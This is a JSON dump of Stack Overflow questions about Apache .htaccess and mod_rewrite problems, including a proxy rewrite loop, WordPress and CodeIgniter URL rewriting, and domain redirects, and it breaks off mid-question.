deflate for mangled headers developer.yahoo.com/blogs/ydn/posts/2010/12/pushing-beyond-gzipping/\n  &lt;IfModule mod_setenvif.c&gt;\n    &lt;IfModule mod_headers.c&gt;\n      SetEnvIfNoCase ^(Accept-EncodXng|X-cept-Encoding|X{15}|~{15}|-{15})$ ^((gzip|deflate)\\s*,?\\s*)+|[X~-]{4,13}$ HAVE_Accept-Encoding\n      RequestHeader append Accept-Encoding \"gzip,deflate\" env=HAVE_Accept-Encoding\n    &lt;/IfModule&gt;\n  &lt;/IfModule&gt;\n\n  # Compress all output labeled with one of the following MIME-types\n  &lt;IfModule mod_filter.c&gt;\n    AddOutputFilterByType DEFLATE application/atom+xml \\\n                                  application/javascript \\\n                                  application/json \\\n                                  application/rss+xml \\\n                                  application/vnd.ms-fontobject \\\n                                  application/x-font-ttf \\\n                                  application/xhtml+xml \\\n                                  application/xml \\\n                                  font/opentype \\\n                                  image/svg+xml \\\n                                  image/x-icon \\\n                                  text/css \\\n                                  text/html \\\n                                  text/plain \\\n                                  text/x-component \\\n                                  text/xml\n  &lt;/IfModule&gt;\n\n&lt;/IfModule&gt;\n</code></pre>\n"},{"tags":["apache",".htaccess","mod-rewrite","reverse-proxy","mod-proxy"],"answer_count":2,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":95,"score":3,"question_id":12363675,"title":"Apache running in infinite loop, request URI too long","body":"<p>I want to read a value from cookie and pass that value as a query string, for that i have used the following rules</p>\n\n<pre><code>**1 : \"RewriteCond %{HTTP_COOKIE} !^preferenceLocale=([^;]+) [NC] \n\nRewriteRule ^/*(.*) http://192.168.132.148/cs/Satellite?pagename=YBWrapper&amp;ybdomain=%{HTTP_HOST}&amp;ybpage=$1&amp;%{QUERY_STRING} [P]\"**\n\nif cookie value is available then i need to execute fallowing set of condition and rule,  \n\n**2 :\"RewriteCond %{HTTP_COOKIE} preferenceLocale=([^;]+) [NC]\n\nRewriteRule ^/*(.*) http://192.168.132.148/cs/Satellite?pagename=YBWrapper&amp;ybdomain=%{HTTP_HOST}&amp;ybpage=$1&amp;preferred_locale=%1&amp;%{QUERY_STRING} [P]\"**\n</code></pre>\n\n<p>These rules works fine individually but if both the rules are placed its failing with the error Request UIR is too long,</p>\n\n<p>if we see the logs the HTTP_HOST is replaced by some junk values</p>\n\n<pre><code>192.168.132.148 - - [11/Sep/2012:11:23:15 +0530] \"GET /cs/Satellite?pagename=YBWrapper&amp;ybdomain=192.168.132.148&amp;ybpage=cs/Satellite&amp;preferred_locale=1302157366636&amp;pagename=YBWrapper&amp;ybdomain=192.168.132.148&amp;ybpage=cs/Satellite&amp;preferred_locale=1302157366636&amp;pagename=YBWrapper&amp;ybdomain=192.168.132.148&amp;ybpage=cs/Satellite&amp;preferred_locale=1302157366636&amp;pagename=YBWrapper&amp;ybdomain=192.168.132.148&amp;ybpage=cs/Satellite&amp;preferred_locale=1302157366636&amp;pagename=YBWrapper&amp;ybdomain=192.168.132.148&amp;ybpage=cs/Satellite&amp;preferred_locale=1302157366636&amp;pagename=YBWrapper&amp;ybdomain=192.168.132.148&amp;ybpage=cs/Satellite&amp;preferred_locale=1302157366636&amp;pagename=YBWrapper&amp;ybdomain=192.168.132.148&amp;ybpage=cs/Satellite&amp;preferred_locale=1302157366636&amp;pagename=YBWrapper&amp;ybdomain=192.168.132.148&amp;ybpage=cs/Satellite&amp;preferred_locale=1302157366636&amp;pagename=YBWrapper&amp;ybdomain=192.168.132.148&amp;ybpage=cs/Satellite&amp;preferred_locale=1302157366636&amp;pagename=YBWrapper&amp;ybdomain=192.168.132.148&amp;ybpage=cs/Satellite&amp;preferred_locale=1302157366636&amp;pagename=YBWrapper&amp;ybdomain=192.168.132.148&amp;ybpage=cs/Satellite&amp;preferred_locale=1302157366636&amp;pagename=YBWrapper&amp;ybdomain=192.168.132.148&amp;ybpage=cs/Satellite&amp;preferred_locale=1302157366636&amp;pagename=YBWrapper&amp;ybdomain=192.168.132.148&amp;ybpage=cs/Satellite&amp;preferred_locale=1302157366636&amp;pagename=YBWrapper&amp;ybdomain=192.168.132.148&amp;ybpage=cs/Satellite&amp;preferred_locale=1302157366636&amp;pagename=YBWrapper&amp;ybdomain=192.168.132.148&amp;ybpage=cs/Satellite&amp;preferred_locale=1302157366636&amp;pagename=YBWrapper&amp;ybdomain=192.168.132.148&amp;ybpage=cs/Satellite&amp;preferred_locale=1302157366636&amp;pagename=YBWrapper&amp;ybdomain=192.168.132.148&amp;ybpage=cs/Satellite&amp;preferred_locale=1302157366636&amp;pagename=YBWrapper&amp;ybdomain=192.168.132.148&amp;ybpage=cs/Satellite&amp;preferred_locale=1302157366636&amp;pagename=YBWrapper&amp;ybdomain=192.168.132.148&amp;ybpage=cs/Satellite&amp;preferred_locale=1302157366636&amp;pagename=YBWrapper&amp;ybdomain=192.168.132.148&amp;ybpage=cs/Satellite&amp;preferred_locale=1302157366636&amp;pagename=YBWrapper&amp;ybdomain=192.168.132.148&amp;ybpage=cs/Satellite&amp;preferred_locale=1302157366636&amp;pagename=YBWrapper&amp;ybdomain=192.168.132.148&amp;ybpage=cs/Satellite&amp;preferred_locale=1302157366636&amp;pagename=YBWrapper&amp;ybdomain=192.168.132.148&amp;ybpage=cs/Satellite&amp;preferred_locale=1302157366636&amp;pagename=YBWrapper&amp;ybdomain=192.168.132.148&amp;ybpage=cs/Satellite&amp;preferred_locale=1302157366636&amp;pagename=YBWrapper&amp;ybdomain=192.168.132.148&amp;ybpage=cs/Satellite&amp;preferred_locale=1302157366636&amp;pagename=YBWrapper&amp;ybdomain=192.168.132.148&amp;ybpage=cs/Satellite&amp;preferred_locale=1302157366636&amp;pagename=YBWrapper&amp;ybdomain=192.168.132.148&amp;ybpage=cs/Satellite&amp;preferred_locale=1302157366636&amp;pagename=YBWrapper&amp;ybdomain=192.168.132.148&amp;ybpage=cs/Satellite&amp;preferred_locale=1302157366636&amp;pagename=YBWrapper&amp;ybdomain=192.168.132.148&amp;ybpage=cs/Satellite&amp;preferred_locale=1302157366636&amp;pagename=YBWrapper&amp;ybdomain=192.168.132.148&amp;ybpage=cs/Satellite&amp;preferred_locale=1302157366636&amp;pagename=YBWrapper&amp;ybdomain=192.168.132.148&amp;ybpage=cs/Satellite&amp;preferred_locale=1302157366636&amp;pagename=YBWrapper&amp;ybdomain=192.168.132.148&amp;ybpage=cs/Satellite&amp;preferred_locale=1302157366636&amp;pagename=YBWrapper&amp;ybdomain=192.168.132.148&amp;ybpage=cs/Satellite&amp;preferred_locale=1302157366636&amp;pagename=YBWrapper&amp;ybdomain=192.168.132.148&amp;ybpage=cs/Satellite&amp;preferred_locale=1302157366636&amp;pagename=YBWrapper&amp;ybdomain=192.168.132.148&amp;ybpage=cs/Satellite&amp;preferred_locale=1302157366636&amp;pagename=YBWrapper&amp;ybdomain=192.168.132.148&amp;ybpage=cs/Satellite&amp;preferred_locale=1302157366636&amp;pagename=YBWrapper&amp;ybdomain=192.168.132.148&amp;ybpage=cs/Satellite&amp;preferred_locale=1302157366636&amp;pagename=YBWrapper&amp;ybdomain=192.168.132.148&amp;ybpage=cs/Satellite&amp;preferred_locale=1302157366636&amp;pagename=YBWrapper&amp;ybdomain=192.168.132.148&amp;ybpage=cs/Satellite&amp;preferred_locale=1302157366636&amp;pagename=YBWrapper&amp;ybdomain=192.168.132.148&amp;ybpage=cs/Satellite&amp;preferred_locale=1302157366636&amp;pagename=YBWrapper&amp;ybdomain=192.168.132.148&amp;ybpage=cs/Satellite&amp;preferred_locale=1302157366636&amp;pagename=YBWrapper&amp;ybdomain=192.168.132.148&amp;ybpage=cs/Satellite&amp;preferred_locale=1302157366636&amp;pagename=YBWrapper&amp;ybdomain=192.168.132.148&amp;ybpage=cs/Satellite&amp;preferred_locale=1302157366636&amp;pagename=YBWrapper&amp;ybdomain=192.168.132.148&amp;ybpage=cs/Satellite&amp;preferred_locale=1302157366636&amp;pagename=YBWrapper&amp;ybdomain=192.168.132.148&amp;ybpage=cs/Satellite&amp;preferred_locale=1302157366636&amp;pagename=YBWrapper&amp;ybdomain=192.168.132.148&amp;ybpage=cs/Satellite&amp;preferred_locale=1302157366636&amp;pagename=YBWrapper&amp;ybdomain=192.168.132.148&amp;ybpage=cs/Satellite&amp;preferred_locale=1302157366636&amp;pagename=YBWrapper&amp;ybdomain=192.168.132.148&amp;ybpage=cs/Satellite&amp;preferred_locale=1302157366636&amp;pagename=YBWrapper&amp;ybdomain=192.168.132.148&amp;ybpage=cs/Satellite&amp;preferred_locale=1302157366636&amp;pagename=YBWrapper&amp;ybdomain=192.168.132.148&amp;ybpage=cs/Satellite&amp;preferred_locale=1302157366636&amp;pagename=YBWrapper&amp;ybdomain=192.168.132.148&amp;ybpage=cs/Satellite&amp;preferred_locale=1302157366636&amp;pagename=YBWrapper&amp;ybdomain=192.168.132.148&amp;ybpage=cs/Satellite&amp;preferred_locale=1302157366636&amp;pagename=YBWrapper&amp;ybdomain=192.168.132.148&amp;ybpage=cs/Satellite&amp;preferred_locale=1302157366636&amp;pagename=YBWrapper&amp;ybdomain=192.168.132.148&amp;ybpage=cs/Satellite&amp;preferred_locale=1302157366636&amp;pagename=YBWrapper&amp;ybdomain=192.168.132.148&amp;ybpage=cs/Satellite&amp;preferred_locale=1302157366636&amp;pagename=YBWrapper&amp;ybdomain=192.168.132.148&amp;ybpage=cs/Satellite&amp;preferred_locale=1302157366636&amp;pagename=YBWrapper&amp;ybdomain=192.168.132.148&amp;ybpage=cs/Satellite&amp;preferred_locale=1302157366636&amp;pagename=YBWrapper&amp;ybdomain=192.168.132.148&amp;ybpage=cs/Satellite&amp;preferred_locale=1302157366636&amp;pagename=YBWrapper&amp;ybdomain=192.168.132.148&amp;ybpage=cs/Satellite&amp;preferred_locale=1302157366636&amp;pagename=YBWrapper&amp;ybdomain=192.168.132.148&amp;ybpage=cs/Satellite&amp;preferred_locale=1302157366636&amp;pagename=YBWrapper&amp;ybdomain=192.168.132.148&amp;ybpage=cs/Satellite&amp;preferred_locale=1302157366636&amp;pagename=YBWrapper&amp;ybdomain=192.168.132.148&amp;ybpage=cs/Satellite&amp;preferred_locale=1302157366636&amp;pagename=YBWrapper&amp;ybdomain=192.168.132.148&amp;ybpage=cs/Satellite&amp;preferred_locale=1302157366636&amp;pagename=YBWrapper&amp;ybdomain=192.168.132.148&amp;ybpage=cs/Satellite&amp;preferred_locale=1302157366636&amp;pagename=YBWrapper&amp;ybdomain=192.168.132.148&amp;ybpage=cs/Satellite&amp;preferred_locale=1302157366636&amp;pagename=YBWrapper&amp;ybdomain=192.168.132.148&amp;ybpage=cs/Satellite&amp;preferred_locale=1302157366636&amp;pagename=YBWrapper&amp;ybdomain=192.168.132.148&amp;ybpage=cs/Satellite&amp;preferred_locale=1302157366636&amp;pagename=YBWrapper&amp;ybdomain=192.168.132.148&amp;ybpage=cs/Satellite&amp;preferred_locale=1302157366636&amp;pagename=YBWrapper&amp;ybdomain=192.168.132.148&amp;ybpage=cs/Satellite&amp;preferred_locale=1302157366636&amp;pagename=YBWrapper&amp;ybdomain=192.168.132.148&amp;ybpage=cs/Satellite&amp;preferred_locale=1302157366636&amp;pagename=YBWrapper&amp;ybdomain=192.168.132.148&amp;ybpage=cs/Satellite&amp;preferred_locale=1302157366636&amp;pagename=YBWrapper&amp;ybdomain=192.168.132.148&amp;ybpage=cs/Satellite&amp;preferred_locale=1302157366636&amp;pagename=YBWrapper&amp;ybdomain=192.168.132.148&amp;ybpage=cs/Satellite&amp;preferred_locale=1302157366636&amp;pagename=YBWrapper&amp;ybdomain=test100.fwqae148.yelladworks.in&amp;ybpage= HTTP/1.1\" 414 345 \"http://test100.fwqae148.yelladworks.in/\" \"Mozilla/5.0 (Windows NT 5.1; rv:15.0) Gecko/20100101 Firefox/15.0.1\"\n</code></pre>\n"},{"tags":["php",".htaccess"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":1,"view_count":45,"score":-1,"question_id":12355752,"title":"htaccess rewrite rules with different paths","body":"<p>I have written a rule to redirect everything after slash to <code>index.php?section=site</code>. This rule works fine: </p>\n\n<pre><code>RewriteRule (.*)(\\/)? index.php?section=site\n</code></pre>\n\n<p>If the uri is <code>/cms/....</code> I want to redirect it to <code>index.php?section=cms</code>. The problem is the first rule says everything going to <code>index.php?section=site</code> so how I can to avoid that if the start of the url is cms ? </p>\n\n<p><strong>I tried this :</strong></p>\n\n<pre><code>RewriteRule (.*)(\\/)? index.php?section=site\nRewriteRule cms\\/(.*) index.php?section=cms [L]\n</code></pre>\n\n<p><strong>For example :</strong></p>\n\n<ol>\n<li>url like : domain.com/login , belongs to index.php?section=site</li>\n<li>url like : domain.com/cms/login , belongs to index.php?section=cms</li>\n</ol>\n"},{"tags":[".htaccess"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":22,"score":0,"question_id":12368013,"title":"Always rewrite a baseurl to /my-page","body":"<p>For many reasons, I need to rewrite my Base URL to a page, which is a hub. </p>\n\n<p>i.e. <a href=\"http://data.mydomain.com\" rel=\"nofollow\">http://data.mydomain.com</a> always directs the user to <a href=\"http://data.mydomain.com/my-page\" rel=\"nofollow\">http://data.mydomain.com/my-page</a></p>\n\n<p>What's the best way to do this?</p>\n"},{"tags":[".htaccess","redirect","ip"],"answer_count":2,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":66,"score":3,"question_id":12362519,"title":"redirect or point an IP to another server","body":"<p>I'm not sure if this question should be ask here because it is coding related, so if I post in the wrong place please suggest me where should I post.</p>\n\n<p>I recently move my server that I use to host in Thailand to Godaddy and I've moved everything except my webboard (forum) and the url it used to be it is <a href=\"http://mydomainname.com/forum\" rel=\"nofollow\">http://mydomainname.com/forum</a> now that forum doesn't exist in the new server with godaddy, but it does exist in the directory call <code>forum</code> in the old server. I don't want to make a load to my Godaddy server and thought if I can still host them in the Thai server, but without having to change the old URL.</p>\n\n<p>With sub domain I think I know the way how to do it, but I don't know how to do this by poiting to another server but with child directory.</p>\n\n<p>I'm not sure if my question is confusing, but what I'm trying to ask is how can I point to another server to to have my forum work on my <a href=\"http://mydomainname.com/forum\" rel=\"nofollow\">http://mydomainname.com/forum</a></p>\n"},{"tags":["php","mysql",".htaccess","rewrite"],"answer_count":3,"favorite_count":2,"up_vote_count":2,"down_vote_count":0,"view_count":48,"score":2,"question_id":12362500,"title":"Use more specific rewrite tool on htaccess","body":"<p>I want replace my link as follows</p>\n\n<blockquote>\n  <p>www.site.com?action&amp;MasterKategori=Music&amp;kategori=Pop&amp;SubKategori=Western </p>\n</blockquote>\n\n<p>by</p>\n\n<blockquote>\n  <p>www.site.com/Music/Pop/Western</p>\n</blockquote>\n\n<p>I use this script </p>\n\n<blockquote>\n  <p>RewriteEngine On </p>\n  \n  <p>RewriteBase /</p>\n  \n  <p>RewriteEngine on</p>\n  \n  <p>RewriteRule ^([a-zA-Z0-9_-]+)/([a-zA-Z0-9_-]+)/([a-zA-Z0-9_-]+) index.php?action&amp;m=$1&amp;k=$2&amp;s=$3</p>\n</blockquote>\n\n<p>It works! But changes my web site preference, all included files (css,js) are rewritten too when the URL is clicked.</p>\n\n<p>How can I stop that happening?</p>\n"},{"tags":["apache",".htaccess","variables"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":17,"score":1,"question_id":12359344,"title":"How do I append a variable to a url that is not a specific destination?","body":"<p>I need to append a variable to a dynamic link for downstream tracking.  </p>\n\n<p>Appending <code>?var=true</code> works for mysite.com/ links (I am detecting existing variables and appending a <code>&amp;var=true</code> if they exist), but it breaks if there is no trailing '/'.  </p>\n\n<p>Preceding the '?' with a '/' corrects this, but then it breaks links in the format of mysite.com/info.php (path problems with CSS).</p>\n\n<p>Is there a server setting or .htaccess change to allow liks in the form of mysite.com?var=true to resolve properly?</p>\n\n<pre><code>mysite.com?var=true     &lt;- broken\n\nmysite.com/?var=true    &lt;- works\n\nmysite.com/info.php?var=true  &lt;-works\n\nmysite.com/info.php/?var=true &lt;-broken\n</code></pre>\n\n<p>Server is apache.</p>\n\n<p>Thanks!</p>\n"},{"tags":[".htaccess","rewrite"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":41,"score":0,"question_id":12357362,"title":"How to rewrite a sub domain to a url","body":"<p>I want to use a Rewrite rule in .htaccess to rewrite access from a sub domain (<code>michigan.sitename.com</code>) to a url - in this case, <code>http://sitename.org/content/michigan-21st-century-community-learning-centers</code>.</p>\n\n<p>The site is based on Drupal.</p>\n\n<p>This is what I have so far, the first few lines are from Drupal, everything after the linebreak is from me.</p>\n\n<p>I am getting a 404 error trying the sub domain</p>\n\n<pre><code>  RewriteEngine on\n  # Rewrite URLs of the form 'x' to the form 'index.php?q=x'.\n  RewriteCond %{REQUEST_FILENAME} !-f\n  RewriteCond %{REQUEST_FILENAME} !-d\n  RewriteCond %{REQUEST_URI} !=/favicon.ico\n  RewriteRule ^(.*)$ index.php?q=$1 [L,QSA]\n\n  # New information for Michigan sub domain\n  RewriteCond %{HTTP_HOST} .\n  RewriteCond %{HTTP_HOST} !^michigan.sitename\\.com\n  RewriteRule (.*) http://www.sitename.com/$1 [R=301, L]\n</code></pre>\n\n<p>Any advice would be helpful</p>\n"},{"tags":["apache",".htaccess","url","rewrite"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":24,"score":0,"question_id":12337960,"title":"ReWrite Rules Issue","body":"<p>I seem to be having an issue with my Apache Rewrites</p>\n\n<pre><code>RewriteEngine on\n\nRewriteBase / \nRewriteRule ^wordpress/?$ / [NC,L,R=301] \n\nRewriteRule ^/$ wordpress/ [NC,L]\n</code></pre>\n\n<p>I simply need to remove /wordpress from the URL as I have pages within Wordpress I want to be seen as the main directory </p>\n\n<p>At the moment the urls are</p>\n\n<p>domain.com/wordpress/blog</p>\n\n<p>I'd rather not have /wordpress, rather domain.com/blog</p>\n\n<p>Any help?</p>\n"},{"tags":["regex","wordpress",".htaccess","mod-rewrite"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":30,"score":1,"question_id":12360045,"title":"Ignored mod_rewrite instructions in .htaccess (WordPress)","body":"<p>We've changed the permalink structure for our WordPress blog (bad idea, I know). I tried to avoid 404s from external links with mod_rewrite instructions in the .htaccess of the base folder of the WordPress installation:</p>\n\n<pre><code>&lt;IfModule mod_rewrite.c&gt;\nRewriteEngine On\nRewriteBase /\nRewriteRule ^\\d\\d\\d\\d\\-\\d\\d\\-\\d\\d_(.+)$ $1 [L]\n# other rewrites\n&lt;/IfModule&gt;\n</code></pre>\n\n<p>I tried a few variations on that, even testing the full URL of one page, but the line keeps being ignored. But mod_rewrite is running - some other rewrites like</p>\n\n<pre><code>RewriteRule ^seiten/abo\\.php[5]?$   subscribe.php5 [R=301,L]\n</code></pre>\n\n<p>work perfectly. I'm stuck. Can anybody help?</p>\n"},{"tags":["wordpress",".htaccess","redirect","domain-name","url-redirection"],"answer_count":1,"favorite_count":1,"up_vote_count":2,"down_vote_count":0,"view_count":108,"score":2,"question_id":12361640,"title":"How to make the root sites use www in a WordPress MultiSite, multiple domains setup?","body":"<p>I have a WordPress MultiSite setup with multiple domains using the same install. I am using the plugin <a href=\"https://wordpress.org/extend/plugins/networks-for-wordpress/\" rel=\"nofollow\">Networks for WordPress</a> to achieve this.</p>\n\n<p>Wordpress is already configured to remove all www, which is good for subdomains, but I would like to configure all root sites to use www. (Leaving the subdomains without www.)</p>\n\n<p>Now my problem is that in such a setup there is only one .htaccess file that seems to be shared by all sites in the network (regardless of what domain they belong to).</p>\n\n<p>Also any redirection from .htaccess would require to first disable the default WordPress redirection for root sites. (Otherwise I'll end up with an endless loop.)</p>\n\n<p><strong>So is there a way to redirect multiple non-www root sites to www, all from the same .htaccess file? And how to disable the default WordPress redirection to non-www for root sites only? Anything else required to get this working?</strong></p>\n\n<p>PS. Unfortunately, I don't have direct access to Apache or DNS configuration, so I can't use these methods instead of .htaccess.</p>\n"},{"tags":["php",".htaccess"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":25,"score":1,"question_id":12361556,"title":"Propper .htaccess rewrite mod","body":"<p>I am currently using .htaccess to rewrite my urls from </p>\n\n<p><strong>example.com/mixtape.php?id=(WHATEVER #)</strong><br />\n...to...<br />\n<strong>example.com/m/(WHATEVER #)</strong> </p>\n\n<p>The code i use to accomplish that is below:</p>\n\n<pre><code>RewriteCond %{REQUEST_FILENAME} !-f\nRewriteCond %{REQUEST_FILENAME} !-d\nRewriteRule ^m\\/([^/\\.]+)/?$ mixtape.php?mixid=$1 [L]\n</code></pre>\n\n<p>The next thing I am trying to achieve, in a clean matter, is to rewrite my <br /></p>\n\n<p><strong>example.com/edit-mixtape.php?id=(WHATEVER #)</strong><br />\n...to...<br />\n<strong>example.com/m/(WHATEVER #)/edit</strong></p>\n\n<hr>\n\n<h2><strong>EDIT:</strong> the \"WHATEVER #\" is the ID of the Mixtape I am editing. Normally i will use \"$_GET['id']\" to see what mixtape i'm referring to and then i fetch everything related to that number.</h2>\n\n<p>IS there anyone out there that would be able to help me successfully write a proper re-write mod?</p>\n"},{"tags":["regex",".htaccess","mod-rewrite"],"answer_count":4,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":33,"score":2,"question_id":12343568,"title":".htaccess help: RewriteRule entire website","body":"<p>I recently launched a website into it's production environment.</p>\n\n<p>This entire website will be in this folder structure:\n/root/v1/website.com/index.php</p>\n\n<p>The help I need is with .htaccess. When I'm upgrading an environment I require 0 downtime, so I want to make the next version of the website in a folder named:\n/root/v2/website.com/index.php and available to switch over immediately.</p>\n\n<p>basically \"flip a switch\", by sending all traffic to the corresponding folder in the current version.</p>\n\n<p>So for example, right now, I would like all traffic that goes from <a href=\"http://www.website.com/cookies/aregreat.php\" rel=\"nofollow\">http://www.website.com/cookies/aregreat.php</a> to be opened at:\n/root/v1/website.com/cookies/aregreat.php</p>\n\n<p>This would apply to images, js and css files too</p>\n\n<p>And then I can obviously change the version from inside the .htaccess and the rest will work itself out.</p>\n\n<p>I'm not familiar with RewriteRule and i'm not too great with regex, the closest I've got to solving the problem is:</p>\n\n<pre><code>RewriteEngine on\nRewriteRule (.*) /../v1.0.0/$1\n</code></pre>\n\n<p>Which is probably totally wrong. Is this even possible?</p>\n\n<p>All help is welcome.</p>\n\n<p>Many Thanks,</p>\n\n<p>Dan</p>\n"},{"tags":["php",".htaccess"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":2,"view_count":46,"score":-2,"question_id":12350803,"title":"my .htaccess file not suport in godady account","body":"<p>all i have setup new webhos <a href=\"http://www.godaddy.com/\" rel=\"nofollow\">http://www.godaddy.com/</a> and i uploaded my website to this <code>godaday</code> hosting.  now problem is that my <code>.htaccess</code> is not working.</p>\n\n<p>just 404 error page is working on <code>.htaccess</code></p>\n\n<p>my .htacces file code is :</p>\n\n<pre><code>RewriteEngine on\nRewriteRule ^(.)web(.).html /webdetail.php?t=$1&amp;webid=$2 [L]\nRewriteRule ^c/([^/\\.]+)/?$ catagory.php?cat=$1 [L]\nRewriteRule ^c/(.)/(.) /catagory.php?page=$1&amp;cat=$2 [L]\nRewriteRule ^c-p/(.) /catagory.php?page=$1 [L]\nRewriteRule ^c/ catagory.php\nRewriteRule ^statep/(.)/(.)/(.) /state.php?state=$1&amp;cat=$2&amp;page=$3 [L]\nRewriteRule ^statep/(.)/(.) /state.php?state=$1&amp;page=$2 [L]\nRewriteRule ^state/(.)/(.) /state.php?state=$1&amp;cat=$2 [L]\nRewriteRule ^state/(.) /state.php?state=$1 [L]\nRewriteRule ^statep /state.php\nRewriteRule ^cityp/(.)/(.)/(.) /city.php?city=$1&amp;cat=$2&amp;page=$3 [L]\nRewriteRule ^cityp/(.)/(.) /city.php?city=$1&amp;page=$2 [L]\nRewriteRule ^city/(.)/(.) /city.php?city=$1&amp;cat=$2 [L]\nRewriteRule ^city/(.) /city.php?city=$1 [L]\nRewriteRule ^cityp /city.php\nRewriteRule ^recentvisit/(.) /recentvisit.php?page=$1 [L]\nRewriteRule ^mostvisited/(.) /mostvisited.php?page=$1 [L]\nRewriteRule ^allcategorys/(.) /allcategorys.php?page=$1 [L]\nRewriteRule ^recentvisit recentvisit.php\nRewriteRule ^mostvisited mostvisited.php\nRewriteRule ^allcategorys allcategorys.php\nRewriteRule ^sms/(.) /sms.php?cat=$1 [L]\nRewriteRule ^webs/(.)/(.) /webdetail.php?webid=$1&amp;t=$2 [L]\nRewriteRule ^mailwebs/(.)/(.) /mailtocompany.php?webid=$1&amp;t=$2 [L]\nRewriteRule ^contactus contactus.php\nRewriteRule ^(.)state(.)/(.) /state.php?state=$1&amp;cat=$2&amp;page=$3 [L]\nRewriteRule ^(.)state/(.) /state.php?state=$1&amp;page=$2 [L]\nRewriteRule ^(.)-state(.).html /state.php?state=$1&amp;cat=$2 [L]\nRewriteRule ^(.)state.html /state.php?state=$1 [L]\nRewriteRule ^(.)-city(.)/(.) /city.php?city=$1&amp;cat=$2&amp;page=$3 [L]\nRewriteRule ^(.)city/(.) /city.php?city=$1&amp;page=$2 [L]\nRewriteRule ^(.)-city(.).html /city.php?city=$1&amp;cat=$2 [L]\nRewriteRule ^(.)-city.html /city.php?city=$1 [L]\nRewriteRule ^(.)-tag/(.) /catagory.php?cat=$1&amp;page=$2 [L]\nRewriteRule ^(.)-tag.html /catagory.php?cat=$1 [L]\nErrorDocument 404 http://www.mydomain.com/error.php\n</code></pre>\n\n<p>i am using php</p>\n"},{"tags":["apache",".htaccess","mod-rewrite","codeigniter-url"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":882,"score":0,"question_id":10540524,"title":"mod_rewrite to remove index.php from Codeigniter in subdirectory","body":"<p>Codeigniter applications commonly use mod_rewrite to exclude the string <code>index.php</code> from the url.  I have two Codeigniter applications within the same domain.  One Codigniter application is in the web root folder, another Codigniter application is in a subfolder of the web root folder. </p>\n\n<p>Codeigniter application 1:</p>\n\n<pre><code>http://domain.com/index.php\n</code></pre>\n\n<p>Codeigniter application 2 (the landing page application):</p>\n\n<pre><code>http://domain.com/land/index.php \n</code></pre>\n\n<p>The two Codeigniter applications are each atomic and do not share any files between them.  Every file in the Codeigniter framework is in <code>public_html/</code> and again in <code>public_html/land/</code>.  So I need to exclude the string <code>index.php</code> in urls addressing the root <code>/</code> folder and also exclude the string <code>index.php</code> in the <code>/land/</code> subfolder.</p>\n\n<p>The .htaccess file in the root folder uses the widely recommended mod_rewrite rules (code below) from the <a href=\"http://codeigniter.com/wiki/mod_rewrite\" rel=\"nofollow\">Codeigniter wiki</a>, and this set of rules works well for the root Codeigniter application (application 1). These rules reside in web root folder.</p>\n\n<pre><code>&lt;IfModule mod_rewrite.c&gt;\n    RewriteEngine On\n    RewriteBase /\n\n    #Removes access to the system folder by users.\n    #Additionally this will allow you to create a System.php controller,\n    #previously this would not have been possible.\n    #'system' can be replaced if you have renamed your system folder.\n    RewriteCond %{REQUEST_URI} ^system.*\n    RewriteRule ^(.*)$ /index.php?/$1 [L]\n\n    #When your application folder isn't in the system folder\n    #This snippet prevents user access to the application folder\n    #Rename 'application' to your applications folder name.\n    RewriteCond %{REQUEST_URI} ^application.*\n    RewriteRule ^(.*)$ /index.php?/$1 [L]\n\n    #Checks to see if the user is attempting to access a valid file,\n    #such as an image or css document, if this isn't true it sends the\n    #request to index.php\n    RewriteCond %{REQUEST_FILENAME} !-f\n    RewriteCond %{REQUEST_FILENAME} !-d\n    RewriteRule ^(.*)$ index.php?/$1 [L]\n&lt;/IfModule&gt;\n\n&lt;IfModule !mod_rewrite.c&gt;\n    # If we don't have mod_rewrite installed, all 404's\n    # can be sent to index.php, and everything works as normal.\n\n    ErrorDocument 404 /index.php\n&lt;/IfModule&gt; \n</code></pre>\n\n<p>The above set of rules has no problem removing <code>index.php</code> from the urls in the root Codeigniter application.  But this set of rules does not seem to allow the mod_rewrite rules in <code>public_html/land/.htaccess</code> to execute.  </p>\n\n<p>When I remove the mod_rewrite rules in <code>public_html/.htaccess</code>, then the mod_rewrite rules in <code>public_html/land/.htaccess</code> start being evaluated.</p>\n\n<p>Is there a way to change the mod_rewrite rules in <code>public_html/.htaccess</code> to handle the special case of a url intended to access the <code>/land/</code> subfolder?</p>\n\n<p>I think the best solution might be to change the mod_rewrite rules in <code>public_html/.htaccess</code> to allow the mod_rewrite rules in <code>public_html/land/.htaccess</code> to execute when the subfolder is addressed in the url.  I am open to any suggestions.</p>\n\n<p>Pre-emptive answer to the question \"why don't you just use a subdomain?\"  1. Saving money on the SSL certificate.  2) Non-techical users are sometimes confused by subdomains for marketing the base domain name.</p>\n\n<p>Pre-emptive answer to \"why don't you combine the Codeigniter applications to use the same files in the framework?\"  Duplicating the framework files is an easy way to keep the versioning repositories separated.</p>\n"},{"tags":[".htaccess","joomla"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":43,"score":1,"question_id":12248995,"title":"Enable mod_rewrite rules for page not managed by Joomla - 403 forbidden","body":"<p>I have a simple issue to resolve. Every time I access one of the URLs explicitly defined in <code>.htaccess</code> (used by Joomla), I'm getting <code>403 Forbidden</code> message.</p>\n\n<p>Details about my setup:</p>\n\n<ol>\n<li>I'm using shared hosting</li>\n<li>Joomla is installed in the root folder</li>\n<li>my newly created page is located in <code>/new/products.php</code></li>\n<li><code>.htaccess</code> is the default one supplied by Joomla with one additional rule: <code>rewriterule $/new/products^ /new/products.php [R=301,L]</code></li>\n<li><code>Options +FollowSymLinks</code> is commented out, but switching it on doesn't change anything</li>\n</ol>\n\n<p>Each time I access <code>mysite.com/new/products</code> 